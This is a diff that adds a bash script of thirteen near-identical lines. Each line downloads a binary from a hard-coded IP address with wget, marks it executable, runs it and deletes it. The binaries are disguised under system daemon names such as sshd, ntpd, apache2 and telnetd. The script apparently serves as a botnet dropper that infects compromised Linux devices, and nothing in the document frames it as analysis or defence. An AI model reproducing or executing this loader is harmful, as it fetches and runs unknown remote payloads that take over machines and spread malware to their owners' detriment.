@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.215.155/mezyntpd; chmod +x mezyntpd; ./mezyntpd; rm -rf mezyntpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.215.155/mezysshd; chmod +x mezysshd; ./mezysshd; rm -rf mezysshd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.215.155/mezyopenssh; chmod +x mezyopenssh; ./mezyopenssh; rm -rf mezyopenssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.215.155/mezybash; chmod +x mezybash; ./mezybash; rm -rf mezybash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.215.155/mezytftp; chmod +x mezytftp; ./mezytftp; rm -rf mezytftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.215.155/mezywget; chmod +x mezywget; ./mezywget; rm -rf mezywget
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.215.155/mezycron; chmod +x mezycron; ./mezycron; rm -rf mezycron
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.215.155/mezyftp; chmod +x mezyftp; ./mezyftp; rm -rf mezyftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.215.155/mezypftp; chmod +x mezypftp; ./mezypftp; rm -rf mezypftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.215.155/mezysh; chmod +x mezysh; ./mezysh; rm -rf mezysh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.215.155/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.215.155/apache2; chmod +x apache2; ./apache2; rm -rf apache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.215.155/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
